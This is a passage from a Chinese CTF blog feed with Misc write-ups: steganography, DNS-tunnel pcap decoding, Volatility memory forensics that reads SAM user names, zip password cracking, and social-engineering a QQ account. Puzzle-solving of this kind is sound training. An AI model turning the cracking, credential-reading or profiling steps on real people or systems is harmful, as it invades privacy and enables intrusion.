coding&#x3D;utf8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># @Author : pig</span><br><span class="line"># @CreatedTime:2019-11-2423:54:02</span><br><span class="line"># @Description : </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def de_code(c):</span><br><span class="line">    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]</span><br><span class="line">    flag &#x3D; []</span><br><span class="line">    c2 &#x3D; [i for i in c.split(&quot;0&quot;)]</span><br><span class="line">    for i in c2:</span><br><span class="line">        c3 &#x3D; 0</span><br><span class="line">        for j in i:</span><br><span class="line">            c3 +&#x3D; int(j)</span><br><span class="line">        flag.append(dic[c3 - 1])</span><br><span class="line">    return flag</span><br><span class="line">def encode(plaintext):</span><br><span class="line">    dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;Z&quot;) + 1)]</span><br><span class="line">    m &#x3D; [i for i in plaintext]</span><br><span class="line">    tmp &#x3D; [];flag &#x3D; []</span><br><span class="line">    for i in range(len(m)):</span><br><span class="line">        for j in range(len(dic)):</span><br><span class="line">            if m[i] &#x3D;&#x3D; dic[j]:</span><br><span class="line">                tmp.append(j + 1)</span><br><span class="line">    for i in tmp:</span><br><span class="line">        res &#x3D; &quot;&quot;</span><br><span class="line">        if i &gt;&#x3D; 8:</span><br><span class="line">            res +&#x3D; int(i&#x2F;8)*&quot;8&quot;</span><br><span class="line">        if i%8 &gt;&#x3D;4:</span><br><span class="line">            res +&#x3D; int(i%8&#x2F;4)*&quot;4&quot;</span><br><span class="line">        if i%4 &gt;&#x3D;2:</span><br><span class="line">            res +&#x3D; int(i%4&#x2F;2)*&quot;2&quot;</span><br><span class="line">        if i%2 &gt;&#x3D; 1:</span><br><span class="line">            res +&#x3D; int(i%2&#x2F;1)*&quot;1&quot;</span><br><span class="line">        flag.append(res + &quot;0&quot;)</span><br><span class="line">    print (&quot;&quot;.join(flag)[:-1])</span><br><span class="line">c &#x3D; input(&quot;输入要解密的数字串:&quot;)</span><br><span class="line">print (de_code(c))</span><br><span class="line">m_code &#x3D; input(&quot;请输入要加密的数字串:&quot;)</span><br><span class="line">encode(m_code)</span><br><span class="line"></span><br><span class="line"># 输入要解密的数字串:884080810882108108821042084010421</span><br><span class="line"># [&#39;T&#39;, &#39;H&#39;, &#39;I&#39;, &#39;S&#39;, &#39;I&#39;, &#39;S&#39;, &#39;F&#39;, &#39;L&#39;, &#39;A&#39;, &#39;G&#39;]</span><br><span class="line"># flag&#123;THISISFLAG&#125;</span><br></pre></td></tr></table></figure><h2><span id="m1bmp">m1bmp</span></h2><p>lsb隐写</p><p>Stegsolve中提取最低位</p><p>后得到base</p><p>解码得到flag</p><hr><h2><span id="tunnel">tunnel</span></h2><p>参考博客</p><p><a class="link" href="https://blog.xpnsec.com/bsidessf-dnscap/">https://blog.xpnsec.com/bsidessf-dnscap/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r tunnel.pcap -Tfields -e dns.qry.name &gt; names.txt</span><br></pre></td></tr></table></figure><p>观察得到的txt</p><p>出现诸多【<a class="link" href="http://evil.im">evil.im<i class="fas fa-external-link-alt"></i></a>】</p><p>观察第一行数据【<a class="link" href="http://UEsDBDMAAwBjAJ12k1KDFWibyjR.evil.im">UEsDBDMAAwBjAJ12k1KDFWibyjR.evil.im<i class="fas fa-external-link-alt"></i></a>】</p><p>尝试一把梭解码，发现base64：【PK3cvRhÊ4】</p><p>zip文件头</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">name &#x3D; open(&#39;names.txt&#39;)</span><br><span class="line">a &#x3D; []</span><br><span class="line">b &#x3D; []</span><br><span class="line">for i in name:</span><br><span class="line">    # print(i)</span><br><span class="line">    if re.findall(&#39;.evil.im&#39;, i):</span><br><span class="line">        if i not in a:</span><br><span class="line">            a.append(i)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>进行数据清洗，</p><p>base64解码后拼接，提示zip格式报错。</p><p>卡住</p><p>事后复现的时候才知道</p><p>此处应当对base64按行补齐，再进行拼接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&quot;11.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    x &#x3D; f.readlines()</span><br><span class="line"></span><br><span class="line">for i in x:</span><br><span class="line">    i &#x3D; i.strip()</span><br><span class="line">    # print(i)</span><br><span class="line">    l &#x3D; 4 - len(i) % 4</span><br><span class="line">    # print(l)</span><br><span class="line">    if l !&#x3D; 4:</span><br><span class="line">        i +&#x3D; &quot;&#x3D;&quot;* l</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>这样才能得到不报错的zip压缩包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def inttobin(a, n):</span><br><span class="line">    ret &#x3D; bin(a)[2:]</span><br><span class="line">    while len(ret) &lt; n:</span><br><span class="line">        ret &#x3D; &#39;0&#39; + ret</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">table &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;2.txt&quot;, &quot;r&quot;)</span><br><span class="line">tmpbin &#x3D; &#39;&#39;</span><br><span class="line">res &#x3D; &#39;&#39;</span><br><span class="line">line &#x3D; f.readline()</span><br><span class="line">while line:</span><br><span class="line">    if line[-2] &#x3D;&#x3D; &#39;&#x3D;&#39;:</span><br><span class="line">        if line[-3] &#x3D;&#x3D; &#39;&#x3D;&#39;:</span><br><span class="line">            tmpbin +&#x3D; inttobin(table.index(line[-4]), 6)[2:]</span><br><span class="line">        else:</span><br><span class="line">            tmpbin +&#x3D; inttobin(table.index(line[-3]), 6)[4:]</span><br><span class="line">    line &#x3D; f.readline()</span><br><span class="line">quotient &#x3D; int(len(tmpbin)&#x2F;8)</span><br><span class="line">for i in range(quotient):</span><br><span class="line">    res +&#x3D; chr(int(tmpbin[8*i:8*i+8], 2))</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"># password: B@%MG&quot;6FjbS8^c#r                                                                     </span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="flag.jpg" alt="flag"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021津门杯misc&quot;&gt;2021津门杯Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;m0usb&quot;&gt;m0usb&lt;/span&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;运气好+师傅们都还没起床，有幸拿了一血&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021年第六届全国网络空间安全技术大赛Misc</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BMisc/</id>
    <published>2021-05-11T06:15:21.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021年第六届全国网络空间安全技术大赛misc">2021年第六届全国网络空间安全技术大赛Misc</span></h3><hr><h4><span id="rgb">RGB</span></h4><p>一共得到28864行RGB数据，</p><p>通过不断尝试分解64 x 11 x 41</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">x &#x3D; 176</span><br><span class="line">y &#x3D; 164</span><br><span class="line">img &#x3D; Image.new(&#39;RGB&#39;,(x,y))</span><br><span class="line">file &#x3D; open(&#39;R#G#B.txt&#39;, &#39;r&#39;)</span><br><span class="line">for width in range(0,x):</span><br><span class="line">    for height in range(0,y):</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        print line</span><br><span class="line">        rgb &#x3D; line.split(&#39;#&#39;)</span><br><span class="line">        print rgb</span><br><span class="line">        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line">img.save(&#39;rgb1.jpg&#39;)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>水平翻转得到flag{c1d836d1db9d42dd}</p><h4><span id="zip">zip</span></h4><p>压缩包ARCHPR爆破得到密码【ff123】</p><p>得到【readme.txt】</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">培根密码</span><br><span class="line">BABBBBBAAAABAAB</span><br><span class="line"># XYJ</span><br><span class="line"># xyj</span><br></pre></td></tr></table></figure><p>【文章.docx】解密后</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>全选上色</p><p>得到flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p><h4><span id="memory_1">Memory_1</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看可能版本 </span><br><span class="line">volatility -f mal.vmem imageinfo </span><br><span class="line"># 查看进程 </span><br><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p>观察时间规律，发现曾经打开cmd</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>然而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>只能看到ipconfig</p><p>发现文章https://wiki.wgpsec.org/knowledge/ctf/Volatility.html</p><p>尝试查看cmd的详细历史命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p>经过多次尝试，确定病毒名为</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>flag{24060da3d327991115a96e7099da25c3}</p><h4><span id="memory_2">Memory_2</span></h4><p>看一下用户信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mal.vmem --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>在最后发现可疑net1.exe，</p><p>flag{45321c07f425d915c55424957353dd07}</p><h4><span id="slowloris">Slowloris</span></h4><p>1)小白做法为，</p><p>统计-》流量图-》遍历所有ip</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>md5加密</p><p>slowloris/195.8.178.227</p><p>得到flag</p><p>flag{3fc9d4a929cb690728d2b76c76483abe}</p><p>2)一般做法为：Slowloris攻击为大流量攻击，通过流量包查看哪两个ip之间有频繁交互即可锁定</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021年第六届全国网络空间安全技术大赛misc&quot;&gt;2021年第六届全国网络空间安全技术大赛Misc&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;rgb&quot;&gt;RGB&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;一共得到28864行RGB数据，&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021</title>
    <link href="http://mklkx.github.io/2021/05/04/ISCC2021/"/>
    <id>http://mklkx.github.io/2021/05/04/ISCC2021/</id>
    <published>2021-05-04T11:31:22.000Z</published>
    <updated>2021-06-06T13:03:21.513Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="iscc2021">ISCC2021</span></h1><hr><h2><span id="练武题">练武题</span></h2><h3><span id="retrieve-the-passcode">Retrieve the passcode</span></h3><blockquote><p>Scatter说他能解开这个古怪的密码，你呢？来试试吧！Flag格式：ISCC{XXX}，XXX为小写字符串，不包括空格</p></blockquote><p>得到【scatter.txt】【computer.rar】</p><p>观察txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;</span><br></pre></td></tr></table></figure><p>结合搜索得知scatter为一种Python绘图函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2、scatter（X，Y，S）S确定每个标记的面积。 S可以是与X和Y相同长度的矢量或标量。如果S为空，则使用默认大小，如果S是标量，则MATLAB绘制所有标记的大小相同。如果S是矢量，则分别对应为X、Y所确定圆的大小；</span><br><span class="line">如scatter([11 12 13 14],[14 15 26 27],[20 25 100 38]);</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「阿卡蒂奥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;akadiao&#x2F;article&#x2F;details&#x2F;73656067</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">def scatter():</span><br><span class="line">    file &#x3D; open(&quot;scatter.txt&quot;, &quot;r&quot;)</span><br><span class="line">    text &#x3D; file.readlines()[0]</span><br><span class="line">    ch &#x3D; text.split(&quot;;&quot;)</span><br><span class="line">    x &#x3D; []</span><br><span class="line">    y &#x3D; []</span><br><span class="line">    for i in ch:</span><br><span class="line">        x.append(float(i.split(&#39;:&#39;)[0]))</span><br><span class="line">        y.append(float(i.split(&#39;:&#39;)[1]))</span><br><span class="line">    plt.scatter(x, y)</span><br><span class="line">    plt.show()</span><br><span class="line">scatter()</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="scatter.png" alt="scatter"></p><p>压缩包密码【365728】</p><p>得到【computer.pdf】莫斯电码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. - .... . ..-. .-.. .- --. .. ...</span><br><span class="line">-.-. .... .- .-.. .-.. . -. --. . .. ... -.-. -.-. - .-- --- --.. . .-. --- - .-- --- --- -. .</span><br><span class="line">#CONGRATULATIONTHEFLAGIS</span><br><span class="line">#CHALLENGEISCCTWOZEROTWOONE</span><br></pre></td></tr></table></figure><p>然后就开始测格式，结果flag是两句话全输😂</p><h3><span id="海市蜃楼-1">海市蜃楼-1</span></h3><blockquote><p>或许你看到的只是海市蜃楼…</p></blockquote><p>word直接转zip</p><p>解压看内容</p><p>【ISCC\mirage-1\海市蜃楼-1\海市蜃楼-1\word\document.xml】</p><h3><span id="我的折扣是多少">我的折扣是多少</span></h3><blockquote><p>小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</p></blockquote><p>得到【give.exe】【me.zip】【discount.mp3】</p><h4><span id="giveexe">【give.exe】</span></h4><p><img lazyload src="/images/loading.svg" data-src="give.png" alt="give"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pass1&#123;\u006b\u0072\u0077&#125;</span><br><span class="line"># unicode-》krw</span><br></pre></td></tr></table></figure><h4><span id="mezip">【me.zip】</span></h4><p>加密压缩包</p><p>010结尾看到base</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cGFzczJ7Z2NjNjY2fQ&#x3D;&#x3D;</span><br><span class="line"># pass2&#123;gcc666&#125;</span><br></pre></td></tr></table></figure><p>结合两个pass解压得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eW91Zm91bmRtZT8&#x3D;</span><br><span class="line"># youfoundme?</span><br></pre></td></tr></table></figure><h4><span id="discountmp3">【discount.mp3】</span></h4><p>mp3想到mp3stego</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">decode -X -P youfoundme? discount.mp3</span><br><span class="line"># ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#125;</span><br><span class="line"># ISCC&#123;Yourdiscount2.15&#125;</span><br></pre></td></tr></table></figure><h2><span id="擂台题">擂台题</span></h2><h3><span id="小明的表情包">小明的表情包</span></h3><blockquote><p>放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA AVARGL AVAR”中，你能帮小红得到小明的表情包吗？</p></blockquote><p>加密压缩包，根据提示为出生日月年，</p><p>凯撒密码为【NINETEEN NINETY NINE】</p><p>解密失败</p><p>尝试爆破，得到密码【07071999】</p><p>jpg格式有误，补全jpg文件头【FFD9FFE0】</p><p>得到flag</p><h3><span id="真作假时假亦真">真作假时假亦真</span></h3><blockquote><p>浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。你能切身体会一下吗？附件下载链接：<a class="link" href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw<i class="fas fa-external-link-alt"></i></a>提取码：a0oh</p></blockquote><p>得到download.wav</p><p>末尾的莫斯电码【ISCC:HEYHONEY,AREYOULOOKINGFORTHEFUCKINGFLAGNOW?】</p><p>丢进010editor发现png文件头，手动分离</p><p>得到一张二维码付款码</p><p>kali里exiftool得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@TyrantK:~&#x2F;桌面# exiftool Untitled1.png </span><br><span class="line">ExifTool Version Number         : 11.92</span><br><span class="line">File Name                       : Untitled1.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 288 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2021:05:04 15:44:32+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2021:05:04 16:06:45+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2021:05:04 16:06:44+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image&#x2F;png</span><br><span class="line">Image Width                     : 1242</span><br><span class="line">Image Height                    : 1704</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate&#x2F;Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Pixels Per Unit X               : 2874</span><br><span class="line">Pixels Per Unit Y               : 2874</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 6.0-c002 79.164488, 2020&#x2F;07&#x2F;10-22:06:53</span><br><span class="line">Creator Tool                    : Adobe Photoshop 22.0 (Windows)</span><br><span class="line">Create Date                     : 2021:05:03 00:55:27+08:00</span><br><span class="line">Modify Date                     : 2021:05:03 00:59:09+08:00</span><br><span class="line">Metadata Date                   : 2021:05:03 00:59:09+08:00</span><br><span class="line">Format                          : image&#x2F;png</span><br><span class="line">Color Mode                      : RGB</span><br><span class="line">ICC Profile Name                : sRGB IEC61966-2.1</span><br><span class="line">Instance ID                     : xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887d</span><br><span class="line">Document ID                     : adobe:docid:photoshop:0cf82e22-bc60-394b-9808-1ec5719e29bc</span><br><span class="line">Original Document ID            : xmp.did:94a58657-d199-9a45-bb13-6a6d55604521</span><br><span class="line">Text Layer Name                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず</span><br><span class="line">Text Layer Text                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず</span><br><span class="line">History Action                  : created, saved</span><br><span class="line">History Instance ID             : xmp.iid:94a58657-d199-9a45-bb13-6a6d55604521, xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887d</span><br><span class="line">History When                    : 2021:05:03 00:55:27+08:00, 2021:05:03 00:59:09+08:00</span><br><span class="line">History Software Agent          : Adobe Photoshop 22.0 (Windows), Adobe Photoshop 22.0 (Windows)</span><br><span class="line">History Changed                 : &#x2F;</span><br><span class="line">Image Size                      : 1242x1704</span><br><span class="line">Megapixels                      : 2.1</span><br></pre></td></tr></table></figure><p>一开始以为是存在乱码，010editor，exiftool，以及图片增高都得到了字符串【ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず】</p><p>确认有东西，开始辨认【xx王者荣耀xx+Q1524552372】</p><p>开始社工</p><p><img lazyload src="/images/loading.svg" data-src="zhenjia.png" alt="zhenjia"></p><p>这是最离谱的，居然不是flag</p><p>于是进入空间，在相册里发现了</p><p><img lazyload src="/images/loading.svg" data-src="psc.jpg" alt="psc"></p><p>同样是010模板查看</p><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wwa.lanzous.com&#x2F;iNVbsoqrz8f</span><br><span class="line">MTVDQw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>下载得到txt</p><p><img lazyload src="/images/loading.svg" data-src="test.png" alt="test"></p><p>社会主义核心价值观加密/解密</p><p><a class="link" href="http://www.atoolbox.net/Tool.php?Id=850">http://www.atoolbox.net/Tool.php?Id=850<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="shzyhxjzg.png" alt="shzyhxjzg"></p><p>卡住</p><p>因为txt里【你会算这笔帐吗？】</p><p>尝试相加，失败</p><p>尝试词频，失败</p><p>最后【中文数字为黑，阿拉伯数字为白，25*25】转二维码</p><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="erweima.png" alt="erweima"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;iscc2021&quot;&gt;ISCC2021&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;练武题&quot;&gt;练武题&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&quot;retrieve-the-passcode&quot;&gt;Retrieve the passc</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021第五届蓝帽杯初赛</title>
    <link href="http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2021-05-04T02:29:08.000Z</published>
    <updated>2021-05-04T11:39:55.631Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021第五届蓝帽杯初赛">2021第五届蓝帽杯初赛</span></h3><hr><h4><span id="冬奥会_is_coming">冬奥会_is_coming</span></h4><p>mp3考虑mp3stego，这一步的密钥是冬奥会开始日期（八位数字）</p><p>用python,print出来后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>找到网站https://wingdingstranslator.com/</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>找到对应的github</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>用notepad++打开</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>发现密钥mp3</p><p>发现cipher字样：<a class="link" href="https://www.ifreesite.com/unicode/">https://www.ifreesite.com/unicode/<i class="fas fa-external-link-alt"></i></a></p><p>得到表情</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>参考这篇博客</p><p><a class="link" href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/<i class="fas fa-external-link-alt"></i></a></p><p>得到带密钥的emoji表情解密网站</p><p><a class="link" href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/<i class="fas fa-external-link-alt"></i></a></p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><h5><span id="flage32f619b-dbcd-49bd-9126-5d841aa01767"><strong>flag{e32f619b-dbcd-49bd-9126-5d841aa01767}</strong></span></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021第五届蓝帽杯初赛&quot;&gt;2021第五届蓝帽杯初赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;冬奥会_is_coming&quot;&gt;冬奥会_is_coming&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;mp3考虑mp3stego，这一步的密钥是冬奥会</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-0</title>
    <link href="http://mklkx.github.io/2021/04/30/MISC-data-0/"/>
    <id>http://mklkx.github.io/2021/04/30/MISC-data-0/</id>
    <published>2021-04-30T12:09:36.000Z</published>
    <updated>2021-05-21T08:54:59.208Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="data0">DATA[0]</span></h1><hr><h3><span id="1usb流量分析">1：USB流量分析</span></h3><h4><span id="usbkeyboarddatahacker">UsbKeyboardDataHacker</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r .&#x2F;example.pcap -T fields -e usb.capdata</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python UsbKeyboardDataHacker.py .&#x2F;example.pcap </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">usb_codes &#x3D; &#123;</span><br><span class="line">    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,</span><br><span class="line">    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,</span><br><span class="line">    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,</span><br><span class="line">    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,</span><br><span class="line">    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,</span><br><span class="line">    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,</span><br><span class="line">    0x29: &quot;*&quot;,# &lt;ESC&gt;</span><br><span class="line">    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,</span><br><span class="line">    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,</span><br><span class="line">    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: 